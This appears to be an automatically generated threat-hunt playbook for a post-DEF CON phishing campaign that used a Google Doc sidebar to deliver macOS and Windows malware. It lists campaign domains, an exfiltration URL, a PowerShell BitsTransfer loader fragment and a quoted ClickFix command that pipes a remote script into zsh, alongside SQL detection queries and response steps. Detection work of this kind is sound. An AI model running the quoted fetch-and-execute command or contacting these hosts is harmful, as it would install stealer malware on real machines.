---
analysis: This hunt uses multi-surface corroboration (software inventory for scoping,
  DNS for infrastructure, and process/script behavior) to distinguish targeted social
  engineering from legitimate software updates, avoiding the noise associated with
  single-indicator rules.
blind_spots:
- id: missing-endpoint-telemetry
  question: Did an unmanaged host interact with the lure?
  requires: Endpoint agents on all hosts in scope
  risk: A host without an agent provides no telemetry for process or script execution,
    leaving a visibility gap for unmanaged assets.
  stage: initial-access-social-media
- id: powershell-block-logging-missing
  question: What specifically executed after the initial PowerShell loader?
  requires: hb_script_activity with Script Block Logging (Event ID 4104)
  risk: Without detailed script block logging, multi-stage or obfuscated PowerShell
    loaders may be invisible beyond the first download command.
  stage: windows-delivery-clickonce
coverage:
- stage: initial-access-social-media
  status: covered
  steps:
  - browser-inventory-scoping
  - rare-infrastructure-interactions
- stage: execution-malicious-sidebar
  status: covered
  steps:
  - rare-infrastructure-interactions
  - triage-delivery
- stage: macos-delivery-clickfix
  status: covered
  steps:
  - macos-shell-pipe-behavior
- stage: windows-delivery-clickonce
  status: covered
  steps:
  - windows-clickonce-behavior
  - windows-powershell-loader-behavior
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: amos-credential-collection
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-persistence-launchd
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: windows-payload-staging
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: This phishing campaign exploits the industry trust established at
    major conferences. A negative result across the estate provides high confidence
    that these specific document-based delivery paths have not been used to breach
    managed hosts.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary is using social engineering to drive users toward a malicious
  Google Doc sidebar that executes platform-specific scripts (macOS ClickFix or Windows
  ClickOnce/PowerShell loaders) from campaign infrastructure.
labels:
- hunt
- attack.t1566.002
- attack.t1566.003
- attack.t1204.001
- attack.t1204.002
- attack.t1059.004
- attack.t1059.001
name: Cross-Platform Malicious Document and Script Delivery
parameters:
  c2_domains:
    default:
    - apple-googleapi.com
    - gapidriver.com
    - 1foqo.lat
    - 2fksf.lat
    - 3pqow.lat
    description: Malicious domains used for script delivery and payload staging.
    from:
      kind: article
      observed: '2026-08-19'
      ref: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    type: list[domain]
  lookback_days:
    default: '14'
    description: Days of telemetry to search.
    type: number
  scope_hosts:
    default: []
    description: Optional list of hostnames to focus the hunt on (usually output from
      the scoping step).
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: The hunt scopes to endpoints with common browsers (Chrome, Safari, Edge,
  Firefox) which are the expected platforms for Google Doc-based lures.
references:
- name: "Huntress \u2014 Post-DEF CON Phishing Uses Malicious Google Doc to Deliver\
    \ Malware"
  url: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
related:
- hunt: amos-stealer-credential-exfiltration
  reason: This hunt identifies delivery; exfiltration of credentials by AMOS is the
    follow-on objective.
  relation: follows
- hunt: macos-persistence-launchd-plist
  reason: LaunchDaemon persistence using 'com.xdivcmp.plist' is a separate hypothesis
    focused on persistence rather than delivery.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: Social Media Phishing
    observables:
    - X account @HartmansDoeke
    - Direct Message with CoinDesk conference lure
    - Google Doc link
    slug: initial-access-social-media
    tactic: initial-access
    techniques:
    - T1566.002
    - T1566.003
  - name: Malicious Google Apps Script Sidebar
    observables:
    - DecryptPanel.html
    - Fake document encryption prompt
    - Google Apps Script sidebar interaction
    slug: execution-malicious-sidebar
    tactic: execution
    techniques:
    - T1204.001
  - name: macOS ClickFix Delivery
    observables:
    - curl -fsSL https://apple-googleapi.com/i | zsh
    - GAPIUpdate.dmg
    - apple-googleapi.com
    - gapiupdate.dmg
    slug: macos-delivery-clickfix
    tactic: execution
    techniques:
    - T1059.004
    - T1204.002
  - name: AMOS Data Theft
    observables:
    - /tmp/lksopo
    - Notes.app database access
    - http://86.54.25.213/log
    slug: amos-credential-collection
    tactic: credential-access
    techniques:
    - T1555
    - T1005
  - name: macOS LaunchDaemon Persistence
    observables:
    - /Library/LaunchDaemons/com.xdivcmp.plist
    - launchctl bootstrap
    - ~/.phost
    - ~/.bhost
    - ~/.botid
    slug: macos-persistence-launchd
    tactic: persistence
    techniques:
    - T1543.001
  - name: Windows ClickOnce and PowerShell Execution
    observables:
    - https://gapidriver.com/installer/GapiUpdate.application
    - '%TEMP%\sys.ps1'
    - https://1foqo.lat/core4
    - Import-Module BitsTransfer; Start-BitsTransfer
    slug: windows-delivery-clickonce
    tactic: execution
    techniques:
    - T1059.001
    - T1204.002
  - name: Windows Payload Staging
    observables:
    - '%LOCALAPPDATA%\Microsoft\Windows\UpdateCache'
    - DockerDesktopSvc.exe
    - SteamClientHelperHost.exe
    - TeraCopyMonMon.exe
    - https://2fksf.lat/res10.php
    slug: windows-payload-staging
    tactic: persistence
    techniques:
    - T1105
  summary: Threat actors targeted DEF CON attendees via X direct messages using a
    conference planning lure that directed victims to a malicious Google Doc. The
    document used a custom Google Apps Script sidebar to trick users into executing
    platform-specific malware, delivering Atomic macOS Stealer (AMOS) on macOS and
    various RAT loaders on Windows via ClickOnce and PowerShell scripts.
series:
  index: 1
  slug: post-def-con-phishing-uses-malicious-google-doc-to-deliver-malware
  title: Post-DEF CON Phishing Uses Malicious Google Doc to Deliver Malware
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Cross-Platform Malicious Document and Script Delivery

This hunt targets the initial delivery and execution phases of a post-conference phishing campaign. Attackers use X (Twitter) DMs to share a link to a Google Doc containing a custom sidebar ('DecryptPanel.html'). Depending on the visitor's OS, the sidebar delivers either a 'curl | zsh' ClickFix-style command for macOS or a ClickOnce installer (.application) and BitsTransfer-based PowerShell loader for Windows.

The hunt identifies hosts with potential exposure via browser software, stack-counts rare interactions with campaign-specific domains, and identifies behavioral patterns of remote content being interpreted directly by local shells or ClickOnce deployment engines. An agent evaluates the chain of interaction and execution to identify high-fidelity compromise events.

## browser-inventory-scoping
<!-- Identify hosts with potential browser exposure -->
Scope the hunt to hosts that have common web browsers installed, as these are the primary entry points for the Google Doc and X DM lures.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hostnames likely used for web browsing. None means the inventory
  surface is empty or no common browsers are registered.
reads:
- device_hostname
- package_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT DISTINCT device_hostname FROM hb_software_inventory WHERE LOWER(package_name) LIKE '%chrome%' OR LOWER(package_name) LIKE '%safari%' OR LOWER(package_name) LIKE '%edge%' OR LOWER(package_name) LIKE '%firefox%' OR LOWER(package_name) LIKE '%browser%'
```

## parallel-evidence-gathering
<!-- Parallel evidence gathering -->
parallel:
- → rare-infrastructure-interactions
- → macos-shell-pipe-behavior
- → windows-clickonce-behavior
- → windows-powershell-loader-behavior
join: → triage-delivery

## rare-infrastructure-interactions
<!-- Rare interactions with campaign infrastructure -->
Identify hosts communicating with the known malicious domains using stack-counting to isolate rare phishing activity from common traffic.

```sqlite target=endpoint role=baseline params=(c2_domains=c2_domains, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Rare DNS resolutions for campaign domains. A hit indicates a host was served
  the lure; silence means no recent interaction with these specific domains.
prevalence:
  by: device_hostname
  key:
  - query_hostname
  rare_below: 3
reads:
- query_hostname
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT query_hostname, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_dns_activity WHERE instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY query_hostname HAVING host_count <= 3
```

## macos-shell-pipe-behavior
<!-- macOS shell-piping execution behavior -->
Detect the 'ClickFix' behavioral pattern where remote content is fetched and interpreted directly by a shell, a common delivery mechanism for macOS stealer payloads.

```sqlite target=endpoint role=detection-candidate params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A shell command fetching and executing a remote script. The presence of
  the pipe character is the primary indicator of this technique.
reads:
- device_hostname
- process_name
- process_cmd_line
- parent_process_name
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT device_hostname, process_name, process_cmd_line, parent_process_name, user_name, time FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%curl %' AND (LOWER(process_cmd_line) LIKE '%|%zsh%' OR LOWER(process_cmd_line) LIKE '%|%sh%')) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## windows-clickonce-behavior
<!-- Windows ClickOnce deployment behavior -->
Detect the usage of the ClickOnce service (dfsvc.exe) to install applications, focusing on manifest files which are used to bypass browser warnings.

```sqlite target=endpoint role=enrichment params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Execution of dfsvc.exe with a remote URL or .application manifest path.
  Many legitimate apps use this, so the agent must weigh it against the C2 domains
  found in other steps.
reads:
- device_hostname
- process_name
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT device_hostname, process_name, process_cmd_line, user_name, time FROM hb_process_activity WHERE LOWER(process_name) LIKE '%dfsvc.exe%' AND (LOWER(process_cmd_line) LIKE '%.application%' OR LOWER(process_cmd_line) LIKE '%http%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## windows-powershell-loader-behavior
<!-- Windows PowerShell loader activity -->
Detect PowerShell script blocks that use BitsTransfer or Invoke-WebRequest to pull and execute content, matching the loader logic described in the research.

```sqlite target=endpoint role=triage params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A script block that downloads a file to %TEMP% and immediately executes
  it. This is a common pattern for the Sleestak/phishing loader.
reads:
- device_hostname
- script_path
- script_content
- time
silence: not_evidence_of_absence
source: hb_script_activity
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT device_hostname, script_path, script_content, time FROM hb_script_activity WHERE (LOWER(script_content) LIKE '%bitstransfer%' OR LOWER(script_content) LIKE '%invoke-webrequest%') AND (LOWER(script_content) LIKE '%iex%' OR LOWER(script_content) LIKE '%invoke-expression%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-delivery
<!-- Triage delivery and execution -->
```agent target=hunter
cite: required
context:
- rare-infrastructure-interactions
- macos-shell-pipe-behavior
- windows-clickonce-behavior
- windows-powershell-loader-behavior
max_iterations: 5
objective: Identify hosts that resolved campaign domains ({{c2_domains}}) and subsequently
  executed shell scripts, ClickOnce installers, or PowerShell loaders.
success_criteria: A citation-backed verdict for each host showing interaction with
  C2 infrastructure or execution signals.
tools:
- endpoint
```

## delivery-decision
<!-- Decision on delivery -->
if~: "the triage verdict is malicious for at least one host involving successful execution of scripts or manifests linked to campaign domains" (confidence: high, judge=hunter)
then: → isolate-infected-host
indeterminate: → manual-analyst-review
unavailable: → manual-analyst-review (blind_spot: missing-endpoint-telemetry)
else: → close-out-negative

## isolate-infected-host
<!-- Isolate infected host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately. Begin evidence collection from /tmp/lksopo (macOS) or %LOCALAPPDATA%\Microsoft\Windows\UpdateCache (Windows) and initiate password resets for all accounts used on the machine.
```
→ manual-analyst-review

## manual-analyst-review
<!-- Manual analyst review -->
```manual target=analyst
Review the cited rows from the triage step. Check for persistence indicators such as 'com.xdivcmp.plist' on macOS. Verify if the user was targeted via social media DMs.
```
→ end

## close-out-negative
<!-- Close out -->
```manual target=analyst
Record the absence of campaign-specific indicators. If DNS/HTTP interaction was found without execution, notify affected users of the phishing attempt.
```
→ end
